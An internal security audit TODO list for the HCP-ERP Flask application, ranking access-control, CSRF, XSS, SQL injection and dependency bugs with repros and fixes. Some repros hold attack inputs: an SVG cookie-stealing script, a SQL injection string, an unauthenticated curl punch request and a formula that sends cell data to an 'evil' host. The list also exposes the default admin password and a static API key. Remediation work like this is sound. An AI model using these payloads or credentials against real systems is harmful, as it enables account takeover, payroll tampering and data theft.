# HCP-ERP — QA / Security TODO

Generated 2026-06-08. Each item: **Severity · File:Line · Root cause · Repro · Fix**.
Fix order: do all **CRITICAL** before any deployment, then HIGH, then MEDIUM/LOW.
Line numbers are approximate (large files); search nearby symbol names if shifted.

Legend: ☐ open. Sev = Critical / High / Medium / Low.

---

## 🔴 CRITICAL

### ☐ C1 — Unauthenticated attendance punch for ANY employee
- **File:** `modules/hr/routes/qr_scan_routes.py:375-429` (`qr_lookup`), `_do_punch` `:143-193`
- **Root cause:** `/hr/attendance/qr-lookup` has **no `@login_required`**, accepts GET+POST, takes attacker-supplied `code`, resolves to any employee (even by raw numeric PK), and writes `RawPunchLog` + rewrites `Attendance` then commits. Attendance feeds salary (LOP/late/OT).
- **Repro:** `curl "http://host/hr/attendance/qr-lookup?code=EMP001"` punches IN; a 2nd call stamps OUT. Iterate codes to punch the whole workforce. Works with no cookie.
- **Fix:** Require a kiosk device token/shared secret + source-IP allowlist (like `receive_logs`’ `PUSH_API_KEY`), restrict to POST, global rate-limit, and stop accepting numeric PK as `code`.

### ☐ C1b — `/fix-admin-perms` callable by any logged-in user
- **File:** `index.py:414-428`
- **Root cause:** `@login_required` only (no admin check); forces `can_view=True` on all admin `UserPermission` rows.
- **Repro:** Any low-priv user GETs `/fix-admin-perms` → re-enables admin visibility an admin deliberately revoked.
- **Fix:** Add `@admin_required`, or delete the route from production.

### ☐ C2 — Public setup routes mint a known-credential admin / mutate modules
- **File:** `index.py:321` `/seed-modules`, `:332` `/setup-procurement`, `:430` `/setup`
- **Root cause:** No auth. `/setup` runs `db.create_all()` + `seed_permissions()` and creates `admin`/`HCP@123` if no admin username exists; `setup_procurement` flips module `is_active`.
- **Repro:** If the `admin` username is ever absent, anyone GETs `/setup` → fresh admin `HCP@123` → full takeover. Otherwise hammer `/seed-modules`/`/setup-procurement` to tamper sidebar/modules.
- **Fix:** Gate behind `@login_required @admin_required` or a one-time env bootstrap flag; never auto-create a known-password admin on a reachable route.

### ☐ C3 — CSRF protection is configured but inert (all state-changing routes forgeable)
- **File:** `core/config.py:15` (`WTF_CSRF_ENABLED=True`), `index.py` (no `CSRFProtect(app)`)
- **Root cause:** `WTF_CSRF_ENABLED` does nothing without `CSRFProtect` or `FlaskForm`; the app uses raw `request.form`/`request.json` everywhere. Only 4 templates even contain `csrf_token`.
- **Repro:** A malicious page auto-submits a form to `/admin/users/add` (create admin), `/admin/user-permissions/<id>/toggle`, `/hr/employees/<id>/delete`, etc., while an admin is logged in → succeeds.
- **Fix:** `from flask_wtf import CSRFProtect; CSRFProtect(app)`; emit `{{ csrf_token() }}` in every form and send `X-CSRFToken` on AJAX/fetch. Exempt only pure webhook endpoints with their own auth.

### ☐ C4 — IDOR: any user can view/edit/delete ANY CRM lead by id
- **File:** `modules/crm/routes/crm_routes.py:1550` (`lead_view`), `:1433` (`lead_edit`), `:1269` (`lead_update_status`), `:1292` (`lead_inline_edit`), `:1971` (`lead_status_change`), `:1506` (`lead_delete`), `:1617` (discussion)
- **Root cause:** Team-member visibility filter exists only on the `leads()` list query; per-record routes do `get_or_404(id)` and check only the module-level `get_perm('crm_leads')`, never ownership.
- **Repro:** Non-admin sales user GETs `/crm/leads/<other_id>` or POSTs `/crm/leads/<other_id>/inline-edit {"field":"status","value":"cancel"}` → reads/mutates another team’s lead.
- **Fix:** Add `_can_access_lead(lead)` (admin/manager OR `assigned_to==uid` OR `created_by==uid` OR `uid in lead.get_team_member_ids()`); 403 right after `get_or_404` in every per-record lead route.

### ☐ C5 — Broken access control: `team_members LIKE '%uid%'` substring over-matches
- **File:** `crm_routes.py:785-786`, `:2063`, `:2148`, `:2178`, `:2215`, `:2888`, `:3028`, `:4146`; NPD `npd_routes.py` `_filter_npd_projects_for_user`, `rd_sample_log_routes.py:108-109`
- **Root cause:** Membership filtered with `LIKE '%{uid}%'` against a CSV string column. `%1%` matches 11, 12, 21, 100… The main list filter at `crm_routes.py:739-743` correctly uses boundary patterns, but these sites regressed.
- **Repro:** User id 1 opens performance dashboard / stale-leads → sees leads for any member id containing digit “1”.
- **Fix:** Reuse the 4-pattern boundary `or_()` (or normalize membership into an association table); extract a `_team_member_clause(uid)` helper used everywhere.

### ☐ C6 — `client_dispatch` blueprint + several CRM mutations have no permission check
- **File:** `client_dispatch_routes.py:336` (`api_send`), `:855` (`client_response`), `:749` (`api_revert`), `:592`; `crm_routes.py:630` (`client_delete`), `:1506` (`lead_delete`), `:1325-1334` (`client_inline_edit` checks `can_view` not `can_edit`)
- **Root cause:** `@login_required` only. `client_response` reject **deactivates all RDSubAssignments** (`:929`) and closes the lead — any user can trigger it.
- **Repro:** Any user POSTs `/client-dispatch/<pid>/client-response {"action":"reject"}` → wipes R&D assignments; or `client_inline_edit` edits client GSTIN with only view rights.
- **Fix:** Add dispatch/CRM permission decorator + ownership to all dispatch routes; change inline-edit gate to `can_edit`; require `can_delete` on single delete routes.

### ☐ C7 — NPD blanket IDOR + arbitrary status injection
- **File:** `modules/npd/routes/npd_routes.py` — `update_milestone:1532`, `add_formulation:1583`, `add_packing:1671`, `save_bom:4594`, `fda_save:4744`, `barcode_*`, `save_note:1115`, `update_npd_milestone:4441`, **`api_status:2108`**, `change_status:1400`
- **Root cause:** Mutations gated only by `@login_required`; fetch by PK with no `_filter_npd_projects_for_user`/assignment check. `api_status` writes an **arbitrary attacker string** as project status (invalid-state injection that can permanently freeze a project).
- **Repro:** `POST /npd/api/project/1/status {"status":"anything"}` or `POST /npd/milestone/1/update status=approved` against a project you were never assigned to → succeeds.
- **Fix:** Shared guard at top of every detail/mutation route (resolve project through `_filter_npd_projects_for_user(...).first()` → 403 if None); whitelist status values.

### ☐ C8 — Stored XSS via inline-served uploads
- **File:** `npd_routes.py:3919-3924` (`serve_upload`), allow-list `:206`, `:258`
- **Root cause:** `ALLOWED` includes `svg` (and no block on `html`); `serve_upload` uses `send_from_directory(...)` with **no `as_attachment`/forced Content-Type** → browser renders `.svg`/`.html` inline in the app origin. (An uploaded `fc29368c_base.html` already sits under `modules/crm/routes/static/uploads/`.)
- **Repro:** Upload `xss.svg` with `<svg ...><script>alert(document.cookie)</script></svg>` as a project comment attachment, open `/npd/uploads/<ts>_xss.svg` → script executes (session/CSRF-token theft; compounded by C3).
- **Fix:** `send_file(..., as_attachment=True, download_name=...)` + `Content-Security-Policy: default-src 'none'`; drop `svg/html/htm/xml/js` from `ALLOWED`; ideally serve uploads from a cookieless domain.

### ☐ C-SQLi — SQL injection in supplier code generation (reachable)
- **File:** `modules/purchase/routes/supplier_routes.py:99` (and defense-in-depth `:237`)
- **Root cause:** `text(f"SELECT COUNT(*) FROM suppliers WHERE supplier_type='{sup_type}' ...")` where `sup_type` comes from POST JSON (`api_save`). `.upper()` does not stop injection (string literals / `OR 1=1` / `--` survive). Reached when no existing `SUP-<type>-NNN` code exists.
- **Repro:** `POST /supplier/api/save {"supplier_type":"RM' OR '1'='1"}` (clean prefix) → injected SQL executes.
- **Fix:** Parameterize: `text("... WHERE supplier_type=:t ...")`, `{'t': sup_type}`. Do the same at `:237`.

---

## 🟠 HIGH

### ☐ H-dep1 — `reportlab` imported but not installed → every PDF route 500s
- **File:** `crm_routes.py:3111+/3614+/3742+/4179+`, `npd_routes.py:3029+/4284+/4386`, `grn_routes.py:1240+`, `purchase_order_routes.py:1451+/2436+`
- **Repro:** GET `/grn/1/pdf`, `/npd/projects/1/download-form`, `/npd/sample-label/1`, `/npd/token-label/1`, any CRM/PO PDF → `ModuleNotFoundError: reportlab` → 500.
- **Fix:** `pip install reportlab`; add `reportlab` to `requirements.txt`.

### ☐ H-dep2 — `qrcode` imported but not installed; `rembg` has no ONNX backend
- **File:** `services/qr_generator.py` (qrcode); material image bg-removal (rembg)
- **Repro:** Any QR-generation path → `ModuleNotFoundError: qrcode`; rembg call → "No onnxruntime backend found".
- **Fix:** `pip install "qrcode[pil]"`; either `pip install "rembg[cpu]"` (+onnxruntime) or guard/feature-flag the bg-removal call. Add both to `requirements.txt`. Verify `pandas`/`xlsxwriter` (currently uninstalled) are truly unused — exports use `openpyxl` (installed).

### ☐ H-tpl1 — Missing templates → 500 on render
- **File:** `npd/dashboard.html` (`npd_routes.py` `dashboard`), `npd/projects.html` (`projects`), `npd/project_form.html`, `hr/loans/detail.html` (`loan_routes.py:206`)
- **Repro:** GET `/npd/dashboard`, `/npd/projects`, `/hr/loans/<id>` → `TemplateNotFound`.
- **Fix:** Create the templates (or fix the route to render the correct existing one).

### ☐ H-tpl2 — `npd/npd_projects.html` TemplateSyntaxError
- **File:** `modules/npd/templates/npd/npd_projects.html:~1252` — `unknown tag 'endblock'`
- **Repro:** GET `/npd/npd-projects` → 500.
- **Fix:** Fix the mismatched/extra `{% endblock %}` near line 1252 (unbalanced block tags).

### ☐ H-tpl3 — `errors/500.html` missing → the 500 handler itself crashes
- **File:** `core/error_handlers.py:25-30` renders `errors/500.html` which doesn’t exist (only 403/404 do).
- **Repro:** Trigger any 500 in production (`debug=False`) → handler raises `TemplateNotFound` → ugly double-fault / blank 500.
- **Fix:** Create `templates/errors/500.html` (mirror 404.html).

### ☐ H-tpl4 — `/admin/user-permissions/<id>` 500: `role_perm_map` undefined
- **File:** `modules/administration/routes/user_routes.py:711-804` (view) vs `admin/permissions/user_permissions.html:98`
- **Root cause:** Template references `role_perm_map` but the view passes only `perm_map`/`sub_perm_map`.
- **Fix:** Pass `role_perm_map` (or remove the template reference). Note `acp_panel` is the working path.

### ☐ H-imp1 — `/crm/api/stale-leads` 500: wrong import path
- **File:** `crm_routes.py:3005` — `from config import Config` (module is `core.config`)
- **Repro:** GET `/crm/api/stale-leads` → `ModuleNotFoundError: config`.
- **Fix:** `from core.config import Config`.

### ☐ H-appr1 — Approval actions 500 on non-existent model attribute
- **File:** `modules/administration/routes/approval_routes.py:144`, `:171` reference `ar.request_type`; model `models/approval.py` has no such column (has `module`/`action`/`record_label`).
- **Repro:** Submit/act on any approval → commit succeeds then audit string build raises `AttributeError` → 500/inconsistent state.
- **Fix:** Use `ar.record_label`/`ar.module`/`ar.action` in the audit message.

### ☐ H1 — CRM sample-order/quotation invoice & PDF download by id (IDOR)
- **File:** `crm_routes.py:3581` (`invoice_download`), `:3549` (`invoice_upload`), `:3737` (`reprint`), `:4815`/`:4829` (quotation reprint/email)
- **Root cause:** No permission/ownership check beyond `@login_required`.
- **Repro:** Iterate `/crm/sample-orders/<id>/invoice-download` → download every client’s invoice/billing/GST.
- **Fix:** Add `get_perm('crm_sample_orders'/'crm_quotations')` + lead-ownership guard via `so.lead`/`quot.lead`.

### ☐ H2 — CRM export bypasses visibility & includes soft-deleted rows
- **File:** `crm_routes.py:939-995` (`leads_export`), counts at `:2234-2285`, distinct filter options `:894-897`
- **Root cause:** `leads_export` omits both `is_deleted=False` and the role-visibility filter → any user exports ALL leads (incl. deleted, all teams).
- **Repro:** Non-admin GET `/crm/leads/export` → full org lead dump.
- **Fix:** Add `is_deleted=False` + the same visibility `or_()` to export and to count/analytics/distinct queries.

### ☐ H3 — CRM Kanban status change lacks `change_status` sub-perm
- **File:** `crm_routes.py:1269-1288` vs the form route `:1971-1976`
- **Root cause:** `lead_update_status` (Kanban) has neither the `change_status` sub-perm nor `can_edit` check that `lead_status_change` enforces.
- **Fix:** Add `_is_admin or get_sub_perm('crm_leads','change_status')` guard + per-record ownership.

### ☐ H4 — NPD core pages + Milestone Master CRUD missing `require_perm`
- **File:** `npd_routes.py` `dashboard:360`, `projects:429`, `npd_projects:2833`, `reports:2044`, `milestone_master_add/edit/delete/toggle:2137-2218`
- **Root cause:** `@login_required` only; milestone-master mutations affect **all** projects globally.
- **Repro:** Non-NPD user `POST /npd/milestone-master/<id>/delete` → deletes a global template.
- **Fix:** `@require_perm('npd'/'npd_projects')`; gate milestone-master behind admin/manager.

### ☐ H5 — NPD status workflow guard incomplete; `convert_lead`/`link_client` unguarded
- **File:** `npd_routes.py:1400-1497` (`change_status`), `:2326` (`convert_lead`), `:2452` (`link_client`)
- **Root cause:** Assignment check applies only to a subset of transitions; `cancelled/complete/commercial` reachable by anyone. `link_client` rewrites `lead.client_id` to an arbitrary client with no validation.
- **Fix:** Apply assignment/role checks to all transitions; validate `client_id` exists; add permission checks.

### ☐ H6 — R&D place-order permanently denied (broken sub-perm key)
- **File:** `modules/rnd/routes/raw_material_sample_routes.py:662` vs `ACTION_KEYS:129-134`
- **Root cause:** Gate uses `_can_action('place_order')` but `'place_order'` is not in `ACTION_KEYS`/ACP → always False for non-admins. Meanwhile `api_dispatch` allows dispatch directly from `supplier_finalized`, skipping the stage.
- **Fix:** Add `'place_order'` to `ACTION_KEYS` + ACP chip, or change the gate to an existing key.

### ☐ H7 — HR: full employee PII/salary/bank export to any logged-in user
- **File:** `modules/hr/routes/hr_routes.py:2874-2888` (`emp_export_single`)
- **Root cause:** `@login_required` only — no `get_perm('hr_employees')`/role check. Workbook includes Aadhaar, PAN, bank acct+IFSC, full salary breakup.
- **Repro:** Any user GETs `/hr/employees/1/export`, `/2/export`, … → every employee’s KYC/bank/salary.
- **Fix:** Add `get_perm('hr_employees').can_view` (+ a salary/KYC sub-perm) gate.

### ☐ H8 — HR: create-login / save-qr / regen-qr unprotected; default password echoed
- **File:** `hr_routes.py:1862-1886` (`emp_create_login`), `:564-576` (`emp_save_qr`), `:1852-1857` (`regen_qr`)
- **Root cause:** `@login_required` only. `emp_create_login` creates a `User` for any employee with default `HCP@123`, active, and flashes the credentials.
- **Repro:** Any user POSTs `/hr/employees/5/create-login` → "Username: <code> Password: HCP@123" → log in as them.
- **Fix:** Require `hr_employees` add/edit perm; generate a random password + force reset; never echo credentials.

### ☐ H9 — XSS in outgoing email & PDF (unescaped user fields)
- **File:** `client_dispatch_routes.py:127-148`; `crm_routes.py:3201-3205`, `:3645-3650`, `:4248-4254`; `mail_routes.py` template-var renderers `:244/:368/:438`
- **Root cause:** User-controlled fields (notes, client/company names, billing address, item names) f-string-concatenated into HTML email bodies and reportlab `Paragraph` markup without escaping.
- **Repro:** Sample-order `bill_company = <font size=40>X` → corrupts PDF; dispatch `notes = <img src=x onerror=...>` → live HTML in client’s mailbox.
- **Fix:** `from markupsafe import escape` (HTML) / `xml.sax.saxutils.escape` (reportlab) on every interpolated value.

### ☐ H10 — Hardcoded secrets in source
- **File:** `core/config.py:4` (SECRET_KEY), `:7` (DB URL incl. password), `:24` (live Gmail app password)
- **Repro:** Anyone with repo read access gets prod credentials; static SECRET_KEY allows session forgery.
- **Fix:** Load all from env (`os.environ['...']`, no insecure default); **rotate** the leaked Gmail app password and DB password; add `.env` to deployment (already gitignored).

### ☐ H11 — Login: enumeration, cross-account resolution, lockout bypass
- **File:** `index.py:248-294`
- **Root cause:** 3-way login (username/email/employee-code) with derived-username/email fallback resolves an identifier to a *different* User; distinct error messages reveal valid/locked/disabled state; failed attempts only increment when a User resolves → spread guesses across non-resolving identifiers to avoid lockout.
- **Fix:** Single generic "Invalid credentials" message; authenticate employee-code only via `emp.user_id` (drop derived-username/email fallback); throttle per source IP too.

### ☐ H12 — Insecure cookie / session flags
- **File:** `core/config.py:16` (`SESSION_COOKIE_SECURE=False`), no `SAMESITE`, remember-me defaults
- **Fix:** `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_SAMESITE='Lax'`, `REMEMBER_COOKIE_SECURE=True`, `REMEMBER_COOKIE_HTTPONLY=True`, set `PERMANENT_SESSION_LIFETIME`; serve over HTTPS.

### ☐ H-debug — `debug=True` on the running server
- **File:** `index.py:487`
- **Root cause:** Werkzeug interactive debugger + stack traces exposed; RCE via debugger PIN if reachable.
- **Fix:** `debug=False` in production (env-driven); run behind a WSGI server (gunicorn/waitress), not `app.run`.

### ☐ H13 — Purchase Order: detail/PDF/print/email/export not permission-gated
- **File:** `purchase_order_routes.py` `view_po:906`, `pdf_po:1891`, `email_po:1927`, `whatsapp_po:2021`, `report_export:2385`, `api_po_items:429`
- **Root cause:** `_can()` (`:100-112`) always returns True; `report_export` has no check at all. `email_po` sends to attacker-supplied `to_email`.
- **Fix:** `require_perm('purchase_rm'/'purchase_pm')` keyed off `po.po_type`; gate email/whatsapp behind an action perm.

### ☐ H14 — GRN: view/PDF/scan/stock/export not category-gated; `_can` returns True
- **File:** `grn_routes.py` `view_grn:880`, `pdf_grn:1213`, `api_scan:2337` (mutates stock), `export_excel:2550`, `api_stock_ledger:1903`, `_can:62-71`
- **Repro:** Non-purchase user `POST /grn/api/scan {qr_code:"RM5-3-1"}` → writes stock; `GET /grn/export?kind=stock_ledger` → data.
- **Fix:** Add `_can_view_type` to every GRN detail/export/scan endpoint; make `_can` enforce real module perms.

### ☐ H15 — Supplier: full CRUD with no real permission check
- **File:** `supplier_routes.py` `api_save:74`, `api_delete:248`, `api_duplicate:147`, `api_restore:278` (no `_can` at all), `api_permanent_delete:290`
- **Root cause:** `_can()` always True; `api_restore` doesn’t even call it.
- **Fix:** Implement `_can` against supplier/purchase module; gate `api_restore`.

### ☐ H16 — Material edit/delete ignores per-type sub-permissions
- **File:** `inventory/routes/material_routes.py:357` (`edit_item`), `:503` (`api_save`), `:655` (`api_delete`)
- **Root cause:** `_can` checks generic `material` perm, not the item’s `type_rm/pm/fg`; `api_save` trusts `material_type_id` from body.
- **Repro:** User with only `type_rm` POSTs `/material/api/save` with a PM/FG `material_type_id` → edits it.
- **Fix:** Validate target item type against the user’s `type_*` sub-perms inside save/edit/delete.

### ☐ H17 — Master-data CRUD has NO permission check
- **File:** `modules/settings/routes/master_routes.py:69` (add), `:100` (edit), `:117` (delete), `:130` (toggle) + all full-master CRUD
- **Root cause:** `@login_required` only; UI hides buttons but server doesn’t enforce. (`:33` even gates `index` on a non-existent `crm_settings`/`lead_master` sub-perm — fails closed by accident.)
- **Repro:** Any user POSTs `/masters/...add/edit/delete` → mutates Lead Status, UOM, HSN/GST rates, QC params, NPD categories.
- **Fix:** `@require_perm('masters','add'/'edit'/'delete')` on every mutating master route; fix the bogus sub-perm name.

### ☐ H18 — Authenticated open mail relay + From spoofing
- **File:** `modules/administration/routes/mail_routes.py:569`, `:603`, `:701`, `:767`; `_send_smtp:476-497`
- **Root cause:** Any user can POST `to_email/subject/body/from_email/from_name`; server sends via corporate Gmail SMTP (DKIM/SPF-aligned to hcpwellness.in). Body is raw HTML.
- **Repro:** Low-priv user → phishing from a trusted domain to any external recipient.
- **Fix:** Gate with `require_sub_perm('crm', mail-send key)`; force `from_*` from config/template; restrict `to_email` to the lead/order’s stored address; sanitize HTML.

### ☐ H-GRN1 — GRN cancel doesn’t reverse scan-created stock (phantom stock)
- **File:** `grn_routes.py:293` (`_reverse_stock_impact` sets `skip_stock=True`), `api_scan:2337`, `cancel_grn:970`
- **Root cause:** Stock-in happens at scan time, but cancel only rolls back PO `received_qty`; scanned `GrnBatchStock`/`GrnScanLog` remain.
- **Repro:** PM GRN → submit → scan boxes → cancel → batch stock still inflated; PO shows 0 received.
- **Fix:** On cancel of a Completed GRN, soft-delete scan logs + decrement batch stock + post reversing ledger rows.

### ☐ H-GRN2 — GRN cancel non-idempotent / `can_cancel` too permissive
- **File:** `grn_routes.py:970`; `models/grn.py:165` (`can_cancel` true for any non-Cancel status)
- **Root cause:** Reversal not idempotent; a Draft GRN can be cancelled bypassing the "only Draft can delete" rule; re-complete/re-cancel drifts PO qty (`max(...,0)` hides it).
- **Fix:** Restrict `can_cancel` to Completed; add a `reversed` flag for idempotency.

### ☐ H-CSV — CSV/Excel formula injection in exports
- **File:** `purchase_order_routes.py:2412` (report_export), formulation `_build_workbook*`, packing_bom `_pb_build_sheet`
- **Root cause:** User-controlled names/notes written to cells with no neutralization of leading `= + - @ \t \r`.
- **Repro:** Material/supplier named `=HYPERLINK("http://evil/?"&A1)` → executes on open.
- **Fix:** Prefix any cell starting with `= + - @ \t \r` with `'` (or write as text) in all Excel/CSV writers.

### ☐ H-report1 — Daily report `mod` used before assignment → audit section silently empty
- **File:** `modules/reports/routes/daily_report_share.py:287` (reads `mod`) before `:290` (assigns it); error swallowed at `:318`
- **Repro:** Load `/daily-report` → audit-log activities missing / misfiltered (first row NameError, later rows test previous row’s module).
- **Fix:** Assign `mod = r.module or 'other'` **before** the `if mod in (...)` skip check.

### ☐ H-report2 — Daily report exposes any user’s activity via `user_id` param
- **File:** `daily_report_share.py:577-615`; `reports/universal_activity_report.py:455-526`
- **Root cause:** `@login_required` only; `filter_uid` taken from query string with no check it equals the caller.
- **Repro:** `GET /daily-report/api?user_id=2` → user 2’s full cross-module activity (incl. client emails, quotation totals).
- **Fix:** Force `filter_uid = current_user.id` for non-managers, or gate behind a reports/management permission.

### ☐ H-qc1 — QC approve: no state-machine guard + self-approval + view-only can approve
- **File:** `modules/qc/routes/qc_routes.py:623` (`api_approve`), `:21-37` (blueprint gate is `can_view` only), `:682/:738/:773`
- **Root cause:** Only guard is "already approved"; a Rejected TRS can flip to Approved and re-add stock; no approver≠creator check; mutating endpoints require only `can_view`.
- **Repro:** Create TRS as user A → approve as A (double stock-in path via reject→approve).
- **Fix:** Enforce allowed transitions; require approver ≠ creator/verifier; add `can_edit`/`qc_approve` gate to approve/reject/set-status/reopen.

### ☐ H-info1 — Unauthenticated PII/data leakage
- **File:** `qr_scan_routes.py:292` (`qr_today_list` — every employee name/code/photo/punch times), `:265` (`qr_stats`), `:201` (`qr_debug_attendance`); `hr_master_routes.py:217/:224/:374/:380` (master lists)
- **Repro:** Unauthenticated GET `/hr/attendance/qr-today-list` → who’s present + arrival times.
- **Fix:** Require auth (or kiosk token) on `qr-today-list`/`qr-debug-attendance`/`qr-stats`; scope to non-PII if the kiosk needs it. Add `@login_required` to the master `/api/*` endpoints.

---

## 🟡 MEDIUM

### ☐ M-att1 — Attendance status computed by 3 divergent code paths
- **File:** `attendance_routes.py:_classify_status:1154-1180` (Present≥7h/Half≥6h/else Absent) vs `_update_attendance:166-171` & `qr_scan_routes.py:_refresh_attendance:109-114` (Present≥4h, never Absent). `receive_logs` skips recompute (`:357-367`).
- **Impact:** Same punches yield Present vs Absent depending on last writer → wrong LOP/payroll.
- **Fix:** One central shift/zone-aware classifier called by all writers.

### ☐ M-sal1 — Salary LOP/half-day double-count + min() clamp hides over-deduction; negative net
- **File:** `salary_routes.py:_compute_salary:123-168`
- **Root cause:** `lop = ab + mp_lop + hd*0.5`; HD already reduces earning via `factor`; `min(lop, month_days)` silently caps errors; on zero-earning months PF/ESIC/TDS still subtracted → negative net.
- **Fix:** When `total_earned<=0` zero statutory deductions; hard-validate `ab+mp+hd<=month_days`.

### ☐ M-sal2 — `_month_leaves` dumps unknown leave types into PL (LOP shown as Paid Leave)
- **File:** `salary_routes.py:_month_leaves:57-73` (`rec[... if ... in rec else 'PL'] += d`)
- **Fix:** Map only valid balance types; route `LOP` to its own bucket / exclude.

### ☐ M-lead1 — Lead status via Kanban/inline doesn’t set/clear `closed_at`
- **File:** `crm_routes.py:1269` (`lead_update_status`), `:1306-1322` (`lead_inline_edit`) vs form route `:1986-1989`
- **Impact:** `lead_age` & close-contribution math corrupted.
- **Fix:** Route all status transitions through one helper that maintains `closed_at`.

### ☐ M-dispatch-num — `gen_code` race → duplicate lead/client codes
- **File:** `crm_routes.py:157-160` (`gen_code`), used `:409`, `:1373`
- **Root cause:** `last.id+1` with no uniqueness retry; concurrent creates collide.
- **Fix:** Retry loop on IntegrityError (mirror `_next_so_number`’s existence loop) or DB sequence.

### ☐ M-massassign1 — Mass assignment of financial fields (material/supplier)
- **File:** `material_routes.py:503-649` (`opening_balance`, `last_purchase_rate`, `msl`, `gst_rate`, `material_type_id`); `supplier_routes.py:103-136` (`supplier_type`, banking, credit)
- **Fix:** Restrict financial/type fields to a privileged action; validate against allowed values.

### ☐ M-massassign2 — Spoofable actor/enum fields in TRS/packing save
- **File:** `trs_routes.py:400-423` (`verified_by_name`, `coa_available`, `new_old_material` free-text), `packing_routes.py:194-200` (QC sets arbitrary `status`/`testing_status`)
- **Fix:** Validate enum fields against constants; derive actor-name from `current_user` server-side.

### ☐ M-pipinstall — Import handlers run `pip install` at request time
- **File:** `formulation_routes.py:815-817/1070/1247`, `packing_bom_routes.py:366-369`
- **Root cause:** On `ImportError` the request thread runs `subprocess.run([sys.executable,'-m','pip','install',...])` → network/DoS/supply-chain risk.
- **Fix:** Make `openpyxl` a deploy dependency; fail with 500 instead of installing.

### ☐ M-import-validate — XLSX import trusts data; BOM matches by name only
- **File:** `formulation_routes.py:878`, `packing_bom_routes.py:852` (`_pb_lookup_fg/_item` first-match)
- **Fix:** Validate ranges (% 0–100, qty>0); surface coercion failures; require explicit material id, not first-name match.

### ☐ M-grn-overreceipt — accepted+rejected not validated vs received; no PO cap
- **File:** `grn_routes.py:780-792`
- **Fix:** Enforce `accepted+rejected==received`; optionally cap received at PO pending unless over-receipt flag set.

### ☐ M-null1 — Unhandled `None`/missing-record → 500 (should be 404/graceful)
- **File:** `npd_daily_report_routes.py` `(l.action_detail)[:80]`, `(proj.product_name)[:40]`; `rd_routes.py:1146/1254` (`User.query.get(...).full_name/.id`); `crm_routes.py:3749`/`:4823` (`so.lead`/`quot.lead` None in PDF); `qc_routes.py:324`/`depreciation_note_routes.py:289` (`.get` then template deref)
- **Fix:** `(x or '')[:n]`; guard/re-fetch related objects; use `_or_404` or null-checks before attribute access.

### ☐ M-date1 — Loan/challan date parse 500 on non-ISO input
- **File:** `loan_routes.py:149`, `challan_routes.py:96` (`strptime('%Y-%m-%d')`, no try/except)
- **Repro:** `POST /hr/loans/add loan_date=07-06-2026` → 500.
- **Fix:** Use the flexible `_parse_date` helper; flash error on failure.

### ☐ M-soft1 — Soft-deleted supplier/material still readable by id
- **File:** `purchase_order_routes.py:1160` (`api_supplier_detail`), `:1335` (`api_item_detail`) — `get_or_404` with no `is_deleted` filter
- **Fix:** Add `is_deleted==False` to detail-by-id endpoints.

### ☐ M-mail-tpl — Email template `{var}` substitution interpolates unescaped data
- **File:** `mail_routes.py:438/368/244` (plain `.replace()`)
- **Note:** No Jinja SSTI (good), but unescaped HTML data injection into outgoing mail.
- **Fix:** HTML-escape interpolated fields.

### ☐ M-audit — Audit log readable/exportable by any logged-in user
- **File:** `user_routes.py:508-510` (`audit_logs`), `:563-565` (`audit_export`) — missing `@admin_required`
- **Fix:** Add `@admin_required`.

### ☐ M-profile-link — Profile auto-links employee by self-asserted email
- **File:** `user_routes.py:197-206` + email change `:279-281` (no verification/uniqueness)
- **Repro:** Set own email to a target employee’s email → next profile load links (and exposes/edits) that employee.
- **Fix:** Never auto-link by self-asserted email; require admin linking; verify email changes.

### ☐ M-failopen — `get_perm` fails OPEN for admins on exception
- **File:** `core/permissions.py:292-295`
- **Fix:** Log and fail closed (or return view-only) on DB exceptions rather than `_full_perm()`.

### ☐ M-lastadmin — `user_edit` allows demoting the last admin / self
- **File:** `user_routes.py:95-111`
- **Fix:** Block demoting/deactivating the last `role='admin'`; prevent self-role-change.

### ☐ M-pwd — Weak default password + low min length, echoed in flash
- **File:** `user_routes.py:70` (`HCP@123`), `:89` (flash), `:263` (min 6)
- **Fix:** Force first-login reset for default-password accounts; raise min length + complexity; stop echoing passwords.

### ☐ M-cd-content-disp — Content-Disposition header injection via project code
- **File:** `npd_routes.py:3299-3343` (`download_npd_form`), `:4346`, `:4426`
- **Root cause:** `code` placed in `attachment; filename="{...}"` without stripping CR/LF/quotes.
- **Fix:** Use `send_file(download_name=...)`/`secure_filename`; strip `[\r\n"]`.

### ☐ M-whatsapp — WhatsApp config/test/send unguarded
- **File:** `modules/npd/routes/npd_whatsapp_routes.py:28/61/123/150`
- **Repro:** Any user sets `manager_numbers` then triggers send → report data to attacker’s number.
- **Fix:** Gate behind admin/npd-manager role.

### ☐ M-dn-delete — Depreciation Note delete/mark-sent/mark-resolved unguarded
- **File:** `depreciation_note_routes.py:346` (`delete_dn`), `:310`, `:328`
- **Fix:** Add role/permission check (contrast `delete_trs` which gates correctly).

### ☐ M-savepo — `save_po` lacks try/except+rollback → dirty session on error
- **File:** `purchase_order_routes.py:597`
- **Fix:** Wrap item loop/commit in try/except with `db.session.rollback()`.

---

## 🟢 LOW

- ☐ **L-debug-endpoints** — Data-leaking debug endpoints reachable by any logged-in user: `npd_routes.py:880` (`?debug_visibility=1`), `:4952` (`/npd/debug/client-info-visibility`), `rd_sample_log_routes.py:982` (`/api/diagnose`, explicitly ungated), `material_routes.py:268` (`api_debug_image`). **Fix:** remove/gate in production.
- ☐ **L-except-pass** — Pervasive broad `except Exception: pass` / `print()` swallowing across NPD/CRM/HR/reports hides failures (e.g. `crm_routes.py:478/492` drops lead-link silently; `npd_routes.py:977` flashes a traceback to the user). **Fix:** narrow excepts, log via `current_app.logger.exception`, surface user-facing errors.
- ☐ **L-pagination** — `quotation_products_list` serial number drifts across pages (`crm_routes.py:4784-4808`). **Fix:** compute serial from flattened rows + cumulative offset.
- ☐ **L-notes-idor** — Lead notes/reminders mutable/deletable by any user (`crm_routes.py:1920/1929/1958`); `LeadNote` is "private per user". **Fix:** ownership check before mutate/delete.
- ☐ **L-float-currency** — Depreciation & some salary math use float, not Decimal (`depreciation_note_routes.py:199-222`). **Fix:** use `Decimal` for currency.
- ☐ **L-receive-key** — `receive_logs` bulk punch ingest uses hardcoded static header `HCP_PUSH_2024` (`attendance_routes.py:30/218`), logged to stderr. **Fix:** move to secret/env, `hmac.compare_digest`, stop logging, rotate. (Promote toward High if endpoint is internet-reachable.)
- ☐ **L-dead-code** — `lead_edit` builds an unused `_old_snap` with a wrong import path (`crm_routes.py:1446`); `base_1.html` appears to be a stale duplicate of `base.html`; many one-off scripts under `scripts/fixes` are retired. **Fix:** prune dead code; remove the stray uploaded `modules/crm/routes/static/uploads/fc29368c_base.html`.
